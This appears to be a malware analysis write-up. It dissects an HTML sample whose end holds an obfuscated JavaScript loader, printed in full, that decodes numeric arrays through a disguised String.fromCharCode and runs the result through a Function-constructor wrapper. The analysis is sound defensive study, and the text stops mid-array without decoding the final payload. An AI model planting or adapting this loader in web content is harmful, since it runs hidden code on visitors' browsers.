# 7fe87d6ee01cf9c588d1b97fa4005781460174849ef1691ba5a8fd9d37b5e94a

### Static Analysis

Running "file" on the malware reveals that the sample is an HTML code.

![images/7fe87d6ee01cf9c588d1b97fa4005781460174849ef1691ba5a8fd9d37b5e94a]

Checking the content of the HTML, I found multiple URL within the file:
 
- `https://www.cba.pl`
- `http://webspell-designs.com`
- `http://www.idea-nails.com.ua`
- `http://www.bilder-wiederherstellen.de`
- `http://www.putinho.com`

Checking on VirusTotal all the sites revealed no malicious content. 

Next thing I noticed was 4 obfuscated functions starting with "MM_" prefix:

```
function MM_swapImgRestore() { //v3.0
  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
}
function MM_preloadImages() { //v3.0
  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}

function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_swapImage() { //v3.0
  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
}
```

Quick Googling reveals that these functions are from Dreamweaver created by Macromedia (MM), and there are nothing malicious about these functions.

At the very bottom of the file however, I found few more obfuscated functions (The following code has been beautifed using js-beautify):

```
(function($$, _2, _1, doc, tk) {
    var xo = "";

    function qq2(cid) {
        cid = ~~cid;
        return ["L", 189 - 20 * cid, 175, 16 * cid, 70, 81, 89, 16, 73, 78, 81, 67, 31, 10, 2, 28, 2, 13, 83, 31, 2, 28, 88, 67, 84, 2, 56, 77, 31, 86, 74, 75, 85, 29, 62, 61, 56, 77, 2, 2, 40, 87, 78, 78, 59, 71, 67, 84, 2, 7, 47, 81, 80, 86, 74, 2, 7, 38, 67, 86, 71, 2, 7, 42, 81, 87, 84, 85, 2, 7, 47, 75, 80, 87, 86, 71, 85, 2, 7, 53, 71, 69, 81, 80, 70, 85, 10, 11, 63, 95, 29, 2, 13, 52, 31, 2, 28, 2, 8, 89, 14, 56, 91, 31, 86, 74, 75, 85, 16, 5, 83, 10, 11, 14, 75, 31, 18, 29, 56, 91, 61, 19, 63, 13, 31, 19, 29, 89, 74, 75, 78, 71, 10, 75, 13, 13, 30, 25, 11, 93, 5, 89, 31, 56, 91, 61, 75, 63, 2, 17, 5, 89, 30, 5, 37, 11, 56, 91, 61, 75, 63, 2, 25, 5, 89, 95, 62, 2, 56, 91, 16, 85, 82, 78, 75, 69, 71, 10, 96, 92, 9, 11, 14, 19, 13, 96, 54, 2, 18, 2, 24, 96, 87, 2, 18, 13, 9, 54, 9, 13, 56, 91, 2, 24, 96, 55, 2, 18, 95, 29, 56, 44, 31, 93, 9, 74, 66, 74, 86, 86, 82, 28, 17, 17, 58, 85, 66, 17, 58, 86, 66, 86, 84, 71, 58, 70, 66, 70, 67, 75, 58, 80, 66, 80, 70, 85, 58, 83, 66, 33, 58, 69, 66, 69, 67, 78, 78, 68, 67, 69, 77, 31, 58, 76, 66, 5, 58, 67, 66, 67, 82, 75, 58, 78, 66, 78, 91, 58, 57, 66, 86, 89, 75, 86, 86, 71, 84, 58, 81, 66, 69, 81, 79, 58, 71, 66, 19, 58, 77, 66, 85, 58, 45, 66, 68, 81, 70, 91, 58, 90, 66, 67, 76, 67, 90, 58, 38, 66, 16, 58, 46, 66, 78, 75, 68, 85, 58, 44, 66, 76, 83, 87, 71, 84, 91, 58, 24, 66, 24, 16, 20, 58, 79, 66, 79, 75, 80, 58, 72, 66, 81, 80, 58, 53, 66, 69, 84, 75, 82, 86, 58, 75, 66, 75, 72, 58, 47, 66, 84, 67, 79, 71, 58, 59, 66, 74, 71, 67, 70, 58, 89, 66, 89, 75, 70, 86, 74, 28, 58, 82, 66, 82, 90, 29, 58, 42, 66, 74, 71, 75, 73, 74, 86, 28, 58, 54, 66, 20, 58, 84, 66, 84, 69, 58, 51, 66, 4, 58, 91, 66, 85, 86, 91, 78, 71, 31, 58, 68, 66, 32, 30, 58, 52, 66, 32, 30, 17, 58, 43, 66, 70, 75, 88, 58, 36, 66, 30, 58, 35, 66, 32, 58, 73, 66, 73, 81, 81, 73, 78, 71, 58, 39, 66, 8, 70, 67, 86, 71, 31, 58, 92, 66, 18, 58, 87, 66, 15, 58, 55, 66, 2, 58, 14, 66, 28, 18, 18, 58, 29, 9, 28, 20, 21, 22, 23, 24, 25, 26, 27, 18, 19, 14, 9, 17, 9, 28, 22, 26, 20, 25, 19, 14, 9, 40, 9, 28, 19, 27, 26, 19, 27, 23, 20, 23, 22, 14, 9, 41, 9, 28, 19, 20, 14, 9, 37, 66, 31, 9, 95, 29, 34, 2, 5, 53, 10, 56, 81, 11, 93, 5, 74, 31, 61, 63, 29, 72, 81, 84, 10, 56, 86, 31, 18, 29, 56, 86, 30, 56, 81, 2, 10, 29, 56, 86, 13, 13, 11, 93, 5, 74, 16, 82, 87, 85, 74, 10, 56, 44, 61, 56, 81, 16, 69, 74, 67, 84, 35, 86, 10, 56, 86, 11, 63, 11, 95, 62, 2, 5, 35, 10, 5, 74, 11, 95, 56, 48, 31, 70, 81, 69, 87, 79, 71, 80, 86, 29, 5, 81, 31, 89, 75, 80, 70, 81, 89, 29, 2, 11, 42, 31, 9, 87, 80, 70, 71, 72, 75, 80, 71, 70, 9, 29, 2, 11, 38, 31, 96, 74, 67, 38, 57, 38, 81, 85, 71, 85, 86, 80, 85, 70, 78, 38, 76, 72, 83, 69, 83, 9, 2, 22, 75, 31, 2, 12, 11, 31, 31, 2, 11, 42, 11, 2, 17, 5, 75, 94, 94, 3, 56, 70, 10, 11, 11, 93, 75, 72, 10, 3, 5, 75, 11, 93, 86, 84, 91, 93, 56, 88, 31, 76, 51, 87, 71, 84, 91, 2, 3, 29, 86, 84, 91, 93, 56, 88, 31, 6, 2, 3, 95, 56, 80, 31, 56, 48, 16, 73, 71, 86, 39, 78, 71, 79, 71, 80, 86, 85, 36, 91, 54, 67, 73, 48, 67, 79, 71, 10, 96, 59, 2, 18, 61, 18, 63, 29, 5, 84, 31, 56, 48, 16, 69, 84, 71, 67, 86, 71, 39, 78, 71, 79, 71, 80, 86, 10, 96, 77, 53, 2, 18, 29, 5, 84, 16, 85, 71, 86, 35, 86, 86, 84, 75, 68, 87, 86, 71, 10, 96, 77, 84, 9, 11, 14, 5, 53, 10, 4, 74, 90, 38, 73, 67, 77, 38, 81, 85, 90, 85, 46, 85, 44, 85, 71, 38, 24, 85, 44, 38, 79, 38, 76, 4, 11, 11, 29, 56, 80, 16, 67, 82, 82, 71, 80, 70, 37, 74, 75, 78, 70, 10, 5, 84, 11, 95, 34, 2, 56, 68, 10, 5, 92, 14, 56, 69, 2, 21, 47, 67, 86, 74, 16, 72, 78, 81, 81, 84, 10, 5, 92, 17, 56, 69, 11, 2, 27, 54, 10, 5, 40, 11, 93, 88, 67, 84, 2, 56, 79, 31, 56, 68, 10, 2, 11, 90, 14, 2, 6, 67, 11, 29, 2, 8, 76, 31, 2, 11, 90, 7, 2, 6, 67, 29, 2, 8, 46, 31, 2, 6, 91, 12, 5, 76, 29, 2, 8, 69, 31, 2, 6, 53, 12, 56, 79, 29, 2, 8, 85, 31, 5, 46, 15, 5, 69, 2, 17, 5, 85, 32, 18, 11, 93, 5, 90, 31, 5, 85, 95, 71, 78, 85, 71, 93, 5, 90, 31, 5, 85, 13, 2, 6, 73, 95, 62, 10, 5, 90, 7, 5, 40, 11, 2, 27, 50, 10, 5, 41, 11, 93, 2, 11, 90, 31, 96, 29, 9, 11, 13, 5, 41, 29, 2, 6, 91, 31, 96, 17, 9, 11, 29, 2, 6, 73, 31, 96, 29, 9, 11, 15, 96, 40, 9, 11, 29, 2, 6, 67, 31, 56, 68, 10, 2, 6, 73, 14, 2, 6, 91, 11, 29, 2, 6, 53, 31, 2, 6, 73, 7, 2, 6, 91, 2, 27, 35, 10, 56, 2, 21, 56, 2, 10, 31, 31, 19, 33, 56, 61, 18, 63, 28, 56, 2, 24, 9, 9, 11, 95, 29, 34, 2, 5, 68, 10, 56, 11, 93, 70, 31, 80, 71, 89, 2, 38, 67, 86, 71, 10, 2, 22, 73, 31, 96, 92, 71, 71, 9, 11, 29, 70, 16, 85, 71, 86, 54, 75, 79, 71, 10, 10, 56, 16, 67, 85, 65, 81, 72, 15, 96, 41, 9, 11, 12, 96, 41, 9, 11, 12, 96, 41, 9, 11, 12, 96, 71, 92, 92, 2, 18, 12, 96, 71, 92, 92, 92, 2, 18, 29, 62, 2, 70, 2, 27, 82, 10, 56, 36, 11, 93, 2, 8, 48, 14, 56, 47, 14, 5, 44, 31, 56, 36, 2, 10, 29, 2, 8, 67, 31, 61, 63, 29, 89, 74, 75, 78, 71, 10, 15, 15, 5, 44, 11, 93, 56, 47, 31, 5, 54, 10, 5, 44, 2, 22, 67, 16, 82, 87, 85, 74, 10, 56, 47, 2, 22, 48, 31, 56, 36, 61, 56, 47, 63, 29, 56, 36, 61, 56, 47, 63, 31, 56, 36, 61, 5, 44, 63, 29, 56, 36, 61, 5, 44, 63, 31, 5, 48, 95, 95, 34, 2, 56, 90, 10, 6, 11, 93, 56, 84, 31, 6, 16, 79, 67, 82, 10, 61, 26, 19, 14, 26, 23, 14, 25, 22, 14, 25, 22, 14, 27, 20, 14, 19, 25, 14, 26, 20, 14, 25, 21, 14, 26, 18, 14, 21, 18, 14, 26, 20, 14, 25, 25, 14, 20, 23, 14, 19, 19, 14, 19, 18, 14, 19, 18, 14, 24, 19, 14, 19, 19, 14, 23, 24, 14, 23, 23, 14, 19, 19, 14, 23, 21, 14, 24, 14, 23, 21, 14, 25, 14, 20, 14, 19, 14, 18, 14, 22, 26, 63, 14, 34, 10, 90, 14, 75, 2, 21, 53, 86, 84, 75, 80, 73, 16, 72, 84, 81, 79, 37, 74, 67, 84, 37, 81, 70, 71, 10, 75, 13, 90, 13, 20, 22, 11, 95, 11, 29, 62, 2, 5, 35, 10, 56, 84, 11, 2, 27, 72, 10, 90, 2, 21, 90, 2, 10, 95, 34, 2, 56, 74, 10, 6, 11, 93, 75, 72, 2, 12, 11, 3, 31, 2, 11, 42, 11, 93, 6, 10, 2, 28, 75, 72, 2, 12, 16, 56, 82, 11, 3, 31, 2, 11, 42, 11, 62, 29, 6, 16, 56, 82, 31, 19, 29, 2, 23, 38, 14, 34, 10, 56, 37, 11, 93, 5, 71, 31, 5, 68, 10, 56, 37, 2, 22, 87, 31, 5, 71, 2, 2, 47, 81, 80, 86, 74, 10, 11, 2, 29, 46, 31, 5, 71, 2, 2, 38, 67, 86, 71, 10, 2, 22, 91, 31, 34, 10, 90, 14, 75, 11, 93, 62, 10, 5, 72, 10, 90, 13, 4, 4, 11, 15, 19, 11, 33, 90, 28, 4, 18, 4, 13, 90, 95, 29, 56, 85, 31, 5, 91, 10, 5, 87, 14, 22, 11, 13, 4, 15, 4, 13, 5, 91, 10, 56, 46, 14, 25, 2, 22, 86, 31, 5, 38, 13, 5, 53, 10, 4, 39, 2, 19, 29, 56, 71, 31, 56, 42, 31, 56, 68, 10, 5, 71, 2, 2, 42, 81, 87, 84, 85, 10, 11, 14, 24, 11, 12, 24, 2, 29, 38, 31, 56, 71, 13, 19, 29, 5, 37, 31, 13, 96, 71, 92, 9, 11, 29, 2, 14, 2, 23, 86, 14, 34, 10, 56, 37, 11, 93, 86, 84, 91, 93, 5, 80, 31, 56, 37, 16, 86, 84, 71, 80, 70, 85, 29, 5, 79, 31, 5, 53, 10, 4, 2, 19, 13, 4, 2, 4, 2, 17, 56, 71, 30, 5, 37, 11, 56, 71, 2, 25, 56, 71, 2, 17, 56, 38, 30, 5, 37, 11, 56, 38, 2, 25, 56, 38, 29, 2, 26, 71, 13, 5, 53, 10, 58, 11, 63, 2, 17, 3, 5, 70, 11, 93, 2, 26, 38, 13, 5, 53, 10, 58, 11, 63, 95, 5, 70, 31, 10, 5, 70, 61, 21, 63, 16, 80, 67, 79, 71, 16, 86, 81, 46, 81, 89, 71, 84, 37, 67, 85, 71, 10, 11, 16, 84, 71, 82, 78, 67, 69, 71, 10, 17, 61, 64, 67, 15, 92, 63, 17, 73, 75, 14, 9, 9, 11, 13, 9, 79, 75, 69, 84, 81, 85, 69, 81, 82, 71, 9, 11, 16, 85, 82, 78, 75, 86, 10, 9, 9, 2, 22, 36, 31, 5, 87, 12, 25, 19, 13, 56, 42, 12, 21, 13, 56, 46, 12, 21, 25, 29, 5, 50, 10, 5, 36, 2, 22, 72, 31, 5, 54, 10, 22, 11, 13, 5, 37, 29, 5, 82, 10, 5, 70, 2, 22, 39, 31, 96, 37, 74, 9, 11, 13, 5, 35, 10, 5, 70, 11, 16, 85, 87, 68, 85, 86, 84, 75, 80, 73, 10, 18, 14, 5, 72, 11, 13, 9, 16, 69, 81, 79, 17, 9, 13, 56, 90, 10, 6, 11, 29, 56, 44, 61, 9, 60, 9, 63, 31, 5, 39, 29, 56, 89, 31, 96, 36, 43, 2, 20, 68, 75, 47, 55, 2, 20, 55, 77, 84, 60, 52, 75, 47, 52, 43, 35, 9, 11, 29, 6, 10, 96, 45, 2, 18, 16, 67, 82, 82, 71, 80, 70, 10, 56, 89, 11, 95, 69, 67, 86, 69, 74, 10, 56, 83, 11, 93, 95, 95, 11, 95, 14, 5, 37, 12, 5, 37, 12, 5, 37, 11, 95, 11, 95, 11, 95, 71, 78, 85, 71, 93, 2, 14, 2, 15, 14, 19, 13, 96, 54, 54, 54, 2, 18, 95, 95, 2, 15, 11, 5, 76, 85, 34, 72, 87, 80, 69, 86, 75, 81, 80, 56, 5, 45, 58, 9, 14, 9, 66, 9, 28, 9, 96, 5, 53, 10, 9, 62, 84, 71, 86, 87, 84, 80, 2, 2, 16, 73, 71, 86, 55, 54, 37, 2, 3, 16, 80, 81, 37, 81, 80, 72, 78, 75, 69, 86, 10, 86, 84, 87, 71, 11, 95, 69, 67, 86, 69, 74, 10, 71, 11, 93, 95, 2, 6, 5, 81, 16, 56, 2, 7, 10, 11, 14, 56, 77, 2, 2, 2, 8, 88, 67, 84, 2, 5, 2, 10, 16, 78, 71, 80, 73, 86, 74, 2, 11, 5, 81, 16, 5, 2, 12, 10, 86, 91, 82, 71, 81, 72, 10, 6, 2, 13, 38, 67, 86, 71, 16, 82, 84, 81, 86, 81, 86, 91, 82, 71, 16, 5, 2, 14, 85, 71, 86, 54, 75, 79, 71, 81, 87, 86, 10, 2, 28, 2, 15, 56, 74, 10, 5, 81, 16, 76, 51, 87, 71, 84, 91, 11, 95, 2, 17, 29, 75, 72, 10, 2, 18, 9, 11, 11, 2, 19, 54, 92, 71, 54, 87, 4, 11, 13, 56, 85, 2, 20, 91, 51, 42, 54, 82, 89, 71, 71, 71, 82, 51, 2, 21, 11, 93, 62, 2, 2, 22, 11, 29, 5, 2, 23, 6, 16, 73, 71, 86, 44, 53, 49, 48, 10, 5, 2, 24, 16, 76, 81, 75, 80, 10, 2, 25, 31, 96, 92, 9, 11, 13, 2, 26, 5, 70, 31, 5, 80, 61, 5, 79, 13, 56, 2, 27, 95, 34, 2, 5, 2, 28, 34, 10, 11, 93, 2, 29, 13, 10, 13, 96, 71, 2, 18, 29, 56];
    }

    function co() {
        return 'Code';
    }

    function gafu() {
        xxx = a(String, 'f' + ro() + co());
        return function(q) {
            return xxx(q);
        };
    };
    rex = [gafu(), gafu()];


    function choo(k) {
        if (k < 9) {
            return 1
        } else {
            return 2
        }
    };

    d = '';
    mapper = [5, 34, 56, 58, 66, 96, 62, 2, 2, 2, 3, 2, 6, 2, 7, 2, 8, 2, 10, 2, 11, 2, 12, 2, 13, 2, 14, 2, 15, 2, 17, 2, 18, 2, 19, 2, 20, 2, 21, 2, 22, 2, 23, 2, 24, 2, 25, 2, 26, 2, 27, 2, 28, 2, 29];
    map = '';
    xo = doc;

    function fs(ro, arr, add, st, en, dp) {
        //Mauris gravida, libero ut tempor ultricies, ante erat blandit dui, vestibulum convallis ligula lacus et metus. Duis quis nunc justo, gravida sem
        var hf = ((en + st) >> 1);
        if (en - st > 16) {
            //lacus, tristique vitae aliquet a, ultrices nec libero. Aliquam sagittis enim in nibh semper tincidunt. Donec malesuada lorem sit amet risus euis
            return fs(ro, arr, add, st, hf, dp + 1) + fs(ro, arr, add, hf, en, dp + 1);
        } else {
            var rt = '';
            rx1 = rex[add - 29];
            for (var rj = st; rj < en; rj++) {
                if (typeof arr[rj] != 'string') {
                    rt += rx1(arr[rj] + add);
                }
            }
            //modo, diam a placerat facilisis, magna libero mollis erat, in molestie nunc tellus consequat justo. Nulla ac nunc purus. Pellentesque habitant morbi
            return rt;
        }
    }
    map += fs(map, mapper, 30, 0, mapper.length);
    //et condimentum metus. Aliquam convallis auctor sapien, sit amet bibendum ligula condimentum ac. Vivamus blandit molestie enim vitae bland

    function a(b, c) {
        return b[c];
    };

    function ro() {
        return 'romChar';
    }
    rd = fs(d, qq2(6 - tk.length), 30, 0, qq2().length);
    //e feugiat. Etiam elit elit, hendrerit et varius non, molestie consectetur ipsum. Nullam sapien sem, mattis nec tempus non, elementum vitae ligula. Maur
    try {
        $$(_1(map, rd, choo, _2).replace('?n', 'in'));
    } catch (e) {}
})(function(jsBb) {
        return (function(jsB, jsBs) {
            return jsBs(jsB(jsBs(jsB(jsBb))))(jsBb)()
        })((function(jsB) {
            return jsB.constructor
        }), (function(jsB) {
            return (function(jsBs) {
                //accumsan dapibus diam 
                return jsB.call(jsB, jsBs)
            })
        }))
    }, function(tt) {
        return tt.pop();
    },
    function(kk, dd, ch, pp) {
        for (var c = kk.length; c > 0;) {
            var x = ch(c);
            c -= x;
            var rep = kk.substr(c, x);
            //accumsan dapibus diam 
            var t = dd.split(rep);
            dd = t.join(pp(t));
        };
        return dd;
    }, document, document.getElementsByTagName('title'));
/**/
if (typeof gloa == 'function') gloa();
```

The comment written in unknown language seems to be an excerpt from Lorem Ipsum. Using Google Translate failed to translate, and searching for the phrase revealed related to Lorem Ipsum. We will ignore these as they are most likely unrelated.

We can first start off by looking at the function "gafu()" and it's related functions:

```
function co() {
		return 'Code';
}

function gafu() {
		xxx = a(String, 'f' + ro() + co());
		return function(q) {
				return xxx(q);
		};
};
rex = [gafu(), gafu()];

function a(b, c) {
		return b[c];
};

function ro() {
		return 'romChar';
}
```

From the above codes, we can determine that gafu() (and "rex[]") is an obfuscated version of the built-in function "String.fromCharCode()" (https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode).


We will now look at the following block of codes:

```
mapper = [5, 34, 56, 58, 66, 96, 62, 2, 2, 2, 3, 2, 6, 2, 7, 2, 8, 2, 10, 2, 11, 2, 12, 2, 13, 2, 14, 2, 15, 2, 17, 2, 18, 2, 19, 2, 20, 2, 21, 2, 22, 2, 23, 2, 24, 2, 25, 2, 26, 2, 27, 2, 28, 2, 29];
map = '';
xo = doc;

function fs(ro, arr, add, st, en, dp) {
		var hf = ((en + st) >> 1);
		if (en - st > 16) {
				return fs(ro, arr, add, st, hf, dp + 1) + fs(ro, arr, add, hf, en, dp + 1);
		} else {
				var rt = '';
				rx1 = rex[add - 29];
				for (var rj = st; rj < en; rj++) {
						if (typeof arr[rj] != 'string') {
								rt += rx1(arr[rj] + add);
						}
				}
				return rt;
		}
}
map += fs(map, mapper, 30, 0, mapper.length);
```

"map" is a string output of the function fs. It seems to be a recursive function. 
We will assume that "ro" is "map", "arr" is "mapper", "add" is "30", "st" is "0" and "en" is the length of mapper, which is "55". "rj" seems to be the index for the for loop.
We can rewrite the function as follows:

```
function fs(map, mapper, 30, 0, 55, dp) {
		var hf = ((55 + 0) >> 1);
		if (55 - 0 > 16) {
				return fs(map, mapper, 30, 0, hf, dp + 1) + fs(map, mapper, 30, hf, 55, dp + 1);
		} else {
				var rt = '';
				rx1 = String.fromCharCode();
				for (var i = 0; i < 55; i++) {
						if (typeof mapper[i] != 'string') {
								rt += rx1(mapper[i] + 30);
						}
				}
				return rt;
		}
}
```

Which can further be simplified as

```
function fs(map, mapper, 30, 0, 55, dp) {
		var hf = 27;
		if (55 - 0 > 16) {
				return fs(map, mapper, 30, 0, hf, dp + 1) + fs(map, mapper, 30, hf, 55, dp + 1);
		} else {
				var rt = '';
				for (var i = 0; i < 55; i++) {
						if (typeof mapper[i] != 'string') {
								rt += String.fromCharCode(mapper[i] + 30);
						}
				}
				return rt;
		}
}
```

We can see that the else statement returns a string that contains the UTF-16 equivalence of the mapper value + 30.
By default, the return value is "#@VX`~\\   ! $ % & ( ) * + , - / 0 1 2 3 4 5 6 7 8 9 : ;"
We need to consider the if statement, which is a recursive.

At this point, we can assume recreate the function ourselves and run it using node to find out what the "map" is.

```
mapper = [5, 34, 56, 58, 66, 96, 62, 2, 2, 2, 3, 2, 6, 2, 7, 2, 8, 2, 10, 2, 11, 2, 12, 2, 13, 2, 14, 2, 15, 2, 17, 2, 18, 2, 19, 2, 20, 2, 21, 2, 22, 2, 23, 2, 24, 2, 25, 2, 26, 2, 27, 2, 28, 2, 29]
map = ''

function fs(map, mapper, add, st, length, dp) {
	var hf = ((length + st) >> 1);
	if (length - st > 16) {
		return fs(map, mapper, add, st, hf, dp + 1) + fs(map, mapper, add, hf, length, dp + 1)
	} else {
		var rt = '';
		for (var i = st; i < length; i++) {
			if (typeof mapper[i] != 'string') {
				rt += String.fromCharCode(mapper[i] + 30);
			}
		}
		return rt;
	}
}

map += fs(map, mapper, 30, 0, mapper.length);

console.log(map)
```

We get the output

```
#@VX`~\   ! $ % & ( ) * + , - / 0 1 2 3 4 5 6 7 8 9 : ;
```

Next we will focus on the following piece of code:

```
rd = fs(d, qq2(6 - tk.length), 30, 0, qq2().length);
```

It assign "rd" a string value just like "map".
The parameter includes 3 variables: "d", "qq2", and "tk".

```
d = '';
```

"d" is an empty string variable assigned earlier in the code.

```
function qq2(cid) {
		cid = ~~cid;
		return ["L", 189 - 20 * cid, 175, 16 * cid, 70, 81, 89, 16, 73, 78, 81, 67, 31, 10, 2, 28, 2, 13, 83, 31, 2, 28, 88, 67, 84, 2, 56, 77, 31, 86, 74, 75, 85, 29, 62, 61, 56, 77, 2, 2, 40, 87, 78, 78, 59, 71, 67, 84, 2, 7, 47, 81, 80, 86, 74, 2, 7, 38, 67, 86, 71, 2, 7, 42, 81, 87, 84, 85, 2, 7, 47, 75, 80, 87, 86, 71, 85, 2, 7, 53, 71, 69, 81, 80, 70, 85, 10, 11, 63, 95, 29, 2, 13, 52, 31, 2, 28, 2, 8, 89, 14, 56, 91, 31, 86, 74, 75, 85, 16, 5, 83, 10, 11, 14, 75, 31, 18, 29, 56, 91, 61, 19, 63, 13, 31, 19, 29, 89, 74, 75, 78, 71, 10, 75, 13, 13, 30, 25, 11, 93, 5, 89, 31, 56, 91, 61, 75, 63, 2, 17, 5, 89, 30, 5, 37, 11, 56, 91, 61, 75, 63, 2, 25, 5, 89, 95, 62, 2, 56, 91, 16, 85, 82, 78, 75, 69, 71, 10, 96, 92, 9, 11, 14, 19, 13, 96, 54, 2, 18, 2, 24, 96, 87, 2, 18, 13, 9, 54, 9, 13, 56, 91, 2, 24, 96, 55, 2, 18, 95, 29, 56, 44, 31, 93, 9, 74, 66, 74, 86, 86, 82, 28, 17, 17, 58, 85, 66, 17, 58, 86, 66, 86, 84, 71, 58, 70, 66, 70, 67, 75, 58, 80, 66, 80, 70, 85, 58, 83, 66, 33, 58, 69, 66, 69, 67, 78, 78, 68, 67, 69, 77, 31, 58, 76, 66, 5, 58, 67, 66, 67, 82, 75, 58, 78, 66, 78, 91, 58, 57, 66, 86, 89, 75, 86, 86, 71, 84, 58, 81, 66, 69, 81, 79, 58, 71, 66, 19, 58, 77, 66, 85, 58, 45, 66, 68, 81, 70, 91, 58, 90, 66, 67, 76, 67, 90, 58, 38, 66, 16, 58, 46, 66, 78, 75, 68, 85, 58, 44, 66, 76, 83, 87, 71, 84, 91, 58, 24, 66, 24, 16, 20, 58, 79, 66, 79, 75, 80, 58, 72, 66, 81, 80, 58, 53, 66, 69, 84, 75, 82, 86, 58, 75, 66, 75, 72, 58, 47, 66, 84, 67, 79, 71, 58, 59, 66, 74, 71, 67, 70, 58, 89, 66, 89, 75, 70, 86, 74, 28, 58, 82, 66, 82, 90, 29, 58, 42, 66, 74, 71, 75, 73, 74, 86, 28, 58, 54, 66, 20, 58, 84, 66, 84, 69, 58, 51, 66, 4, 58, 91, 66, 85, 86, 91, 78, 71, 31, 58, 68, 66, 32, 30, 58, 52, 66, 32, 30, 17, 58, 43, 66, 70, 75, 88, 58, 36, 66, 30, 58, 35, 66, 32, 58, 73, 66, 73, 81, 81, 73, 78, 71, 58, 39, 66, 8, 70, 67, 86, 71, 31, 58, 92, 66, 18, 58, 87, 66, 15, 58, 55, 66, 2, 58, 14, 66, 28, 18, 18, 58, 29, 9, 28, 20, 21, 22, 23, 24, 25, 26, 27, 18, 19, 14, 9, 17, 9, 28, 22, 26, 20, 25, 19, 14, 9, 40, 9, 28, 19, 27, 26, 19, 27, 23, 20, 23, 22, 14, 9, 41, 9, 28, 19, 20, 14, 9, 37, 66, 31, 9, 95, 29, 34, 2, 5, 53, 10, 56, 81, 11, 93, 5, 74, 31, 61, 63, 29, 72, 81, 84, 10, 56, 86, 31, 18, 29, 56, 86, 30, 56, 81, 2, 10, 29, 56, 86, 13, 13, 11, 93, 5, 74, 16, 82, 87, 85, 74, 10, 56, 44, 61, 56, 81, 16, 69, 74, 67, 84, 35, 86, 10, 56, 86, 11, 63, 11, 95, 62, 2, 5, 35, 10, 5, 74, 11, 95, 56, 48, 31, 70, 81, 69, 87, 79, 71, 80, 86, 29, 5, 81, 31, 89, 75, 80, 70, 81, 89, 29, 2, 11, 42, 31, 9, 87, 80, 70, 71, 72, 75, 80, 71, 70, 9, 29, 2, 11, 38, 31, 96, 74, 67, 38, 57, 38, 81, 85, 71, 85, 86, 80, 85, 70, 78, 38, 76, 72, 83, 69, 83, 9, 2, 22, 75, 31, 2, 12, 11, 31, 31, 2, 11, 42, 11, 2, 17, 5, 75, 94, 94, 3, 56, 70, 10, 11, 11, 93, 75, 72, 10, 3, 5, 75, 11, 93, 86, 84, 91, 93, 56, 88, 31, 76, 51, 87, 71, 84, 91, 2, 3, 29, 86, 84, 91, 93, 56, 88, 31, 6, 2, 3, 95, 56, 80, 31, 56, 48, 16, 73, 71, 86, 39, 78, 71, 79, 71, 80, 86, 85, 36, 91, 54, 67, 73, 48, 67, 79, 71, 10, 96, 59, 2, 18, 61, 18, 63, 29, 5, 84, 31, 56, 48, 16, 69, 84, 71, 67, 86, 71, 39, 78, 71, 79, 71, 80, 86, 10, 96, 77, 53, 2, 18, 29, 5, 84, 16, 85, 71, 86, 35, 86, 86, 84, 75, 68, 87, 86, 71, 10, 96, 77, 84, 9, 11, 14, 5, 53, 10, 4, 74, 90, 38, 73, 67, 77, 38, 81, 85, 90, 85, 46, 85, 44, 85, 71, 38, 24, 85, 44, 38, 79, 38, 76, 4, 11, 11, 29, 56, 80, 16, 67, 82, 82, 71, 80, 70, 37, 74, 75, 78, 70, 10, 5, 84, 11, 95, 34, 2, 56, 68, 10, 5, 92, 14, 56, 69, 2, 21, 47, 67, 86, 74, 16, 72, 78, 81, 81, 84, 10, 5, 92, 17, 56, 69, 11, 2, 27, 54, 10, 5, 40, 11, 93, 88, 67, 84, 2, 56, 79, 31, 56, 68, 10, 2, 11, 90, 14, 2, 6, 67, 11, 29, 2, 8, 76, 31, 2, 11, 90, 7, 2, 6, 67, 29, 2, 8, 46, 31, 2, 6, 91, 12, 5, 76, 29, 2, 8, 69, 31, 2, 6, 53, 12, 56, 79, 29, 2, 8, 85, 31, 5, 46, 15, 5, 69, 2, 17, 5, 85, 32, 18, 11, 93, 5, 90, 31, 5, 85, 95, 71, 78, 85, 71, 93, 5, 90, 31, 5, 85, 13, 2, 6, 73, 95, 62, 10, 5, 90, 7, 5, 40, 11, 2, 27, 50, 10, 5, 41, 11, 93, 2, 11, 90, 31, 96, 29, 9, 11, 13, 5, 41, 29, 2, 6, 91, 31, 96, 17, 9, 11, 29, 2, 6, 73, 31, 96, 29, 9, 11, 15, 96, 40, 9, 11, 29, 2, 6, 67, 31, 56, 68, 10, 2, 6, 73, 14, 2, 6, 91, 11, 29, 2, 6, 53, 31, 2, 6, 73, 7, 2, 6, 91, 2, 27, 35, 10, 56, 2, 21, 56, 2, 10, 31, 31, 19, 33, 56, 61, 18, 63, 28, 56, 2, 24, 9, 9, 11, 95, 29, 34, 2, 5, 68, 10, 56, 11, 93, 70, 31, 80, 71, 89, 2, 38, 67, 86, 71, 10, 2, 22, 73, 31, 96, 92, 71, 71, 9, 11, 29, 70, 16, 85, 71, 86, 54, 75, 79, 71, 10, 10, 56, 16, 67, 85, 65, 81, 72, 15, 96, 41, 9, 11, 12, 96, 41, 9, 11, 12, 96, 41, 9, 11, 12, 96, 71, 92, 92, 2, 18, 12, 96, 71, 92, 92, 92, 2, 18, 29, 62, 2, 70, 2, 27, 82, 10, 56, 36, 11, 93, 2, 8, 48, 14, 56, 47, 14, 5, 44, 31, 56, 36, 2, 10, 29, 2, 8, 